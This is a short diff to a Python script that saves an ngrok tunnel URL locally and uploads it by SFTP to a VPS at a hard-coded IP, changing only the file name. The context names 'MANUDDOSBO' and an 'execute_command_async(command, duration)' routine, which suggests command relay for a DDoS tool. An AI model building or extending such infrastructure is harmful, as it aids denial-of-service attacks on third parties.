@@ -29,9 +29,9 @@ def configure_ngrok():
         print(f"Failed to configure ngrok: {str(e)}")
 
 def update_soul_txt(public_url):
-    with open("anony2.txt", "w") as file:
+    with open("anony2.txt.txt", "w") as file:
         file.write(public_url)
-    print(f"New ngrok link saved in MANUDDOSBO.txt")
+    print(f"New ngrok link saved in anony2.txt.txt")
 
 def update_vps_soul_txt(public_url):
     vps_ip = "93.127.213.184"
@@ -43,13 +43,13 @@ def update_vps_soul_txt(public_url):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps_ip, username=vps_user, password=vps_password)
         sftp = ssh.open_sftp()
-        with sftp.open("anony2.txt", "w") as file:
+        with sftp.open("anony2.txt.txt", "w") as file:
             file.write(public_url)
         sftp.close()
         ssh.close()
-        print("Updated anony2.txt on VPS successfully.")
+        print("Updated anony2.txt.txt on VPS successfully.")
     except Exception as e:
-        print(f"Failed to update anony2.txt on VPS: {str(e)}")
+        print(f"Failed to update anony2.txt.txt on VPS: {str(e)}")
 
 def execute_command_async(command, duration):
     def run(command_id):
